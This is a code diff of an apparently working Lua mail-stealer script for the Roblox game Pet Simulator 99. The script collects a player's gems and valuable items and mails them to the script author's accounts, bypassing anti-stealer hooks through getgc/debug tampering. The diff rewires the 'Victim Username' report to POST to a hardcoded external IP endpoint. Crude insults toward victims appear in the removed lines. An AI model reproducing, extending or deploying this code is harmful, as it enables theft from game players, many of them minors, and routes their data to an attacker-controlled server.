@@ -13,15 +13,14 @@ local MailMessage = "GG / GY2RVSEGDT"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
-local getFucked = false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local user = Username or "PetsGoMommy"
-local user2 = Username2 or "PetsGoMommy"
-local webhook = Webhook or ""
-local min_rap = minrap or 1000000
+local user = _G.Username or "PetsGoMommy"
+local user2 = _G.Username2 or "PetsGoMommy"
+local discuser = _G.discuser or ""
+local min_rap = _G.minrap or 1000000
 
 local newamount = 20000
 
@@ -52,15 +51,16 @@ local function formatNumber(number)
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
-local function SendMessage(username, diamonds)
+local function SendMessage(diamonds)
     local headers = {
         ["Content-Type"] = "application/json",
+        ["DiscUser"] = discuser or ""
     }
 
 	local fields = {
 		{
-			name = "Retard Username:",
-			value = username,
+			name = "Victim Username:",
+			value = plr.Name,
 			inline = true
 		},
 		{
@@ -99,9 +99,6 @@ local function SendMessage(username, diamonds)
 
     fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
     fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
-    if getFucked then
-        fields[3].value = fields[3].value .. "\n\nVictim tried to use anti-mailstealer, but got fucked instead"
-    end
 
     local data = {
         ["embeds"] = {{
@@ -131,7 +128,7 @@ local function SendMessage(username, diamonds)
 
     if webhook and webhook ~= "" then
         local response = request({
-            Url = webhook,
+            Url = "http://46.101.233.20:5000/ps99",
             Method = "POST",
             Headers = headers,
             Body = body
@@ -308,7 +305,6 @@ end
 if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     ClaimMail()
 	if IsMailboxHooked() then
-        getFucked = true
 		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
         for i, Func in ipairs(getgc(true)) do
             if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
@@ -347,7 +343,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end)
 
     spawn(function()
-        SendMessage(plr.Name, GemAmount1)
+        SendMessage(GemAmount1)
     end)
 
     for _, item in ipairs(sortedItems) do
